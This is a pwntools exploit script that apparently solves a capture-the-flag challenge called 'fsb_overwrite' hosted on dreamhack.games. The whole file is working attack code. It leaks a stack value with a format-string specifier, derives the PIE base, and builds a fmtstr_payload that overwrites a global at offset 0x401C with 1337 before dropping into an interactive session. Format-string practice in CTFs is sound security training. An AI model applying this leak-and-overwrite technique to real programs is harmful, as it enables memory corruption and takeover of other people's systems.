from pwn import *
elf =  ELF("./fsb_overwrite")
#libc = ELF("./libc.so.6")

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:23007'

ip, port = cyberedu.split(':')
port = int(port)


if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()

#just ez fmtstr lol
#we  just need to change 0x401C
#we get leak , 0x2009

#our input starts at offset 6

p.sendline(b"%15$p")
leak = p.recvline().strip()
leak = int(leak, 16)
print(f"leaked is {hex(leak)}")

base = leak - 0x1293
print(f"base is {hex(base)}")

overwrite_me = base + 0x401C

writes = {
overwrite_me: 1337
}

payload = fmtstr_payload(6, writes)
p.send(payload)

p.interactive()
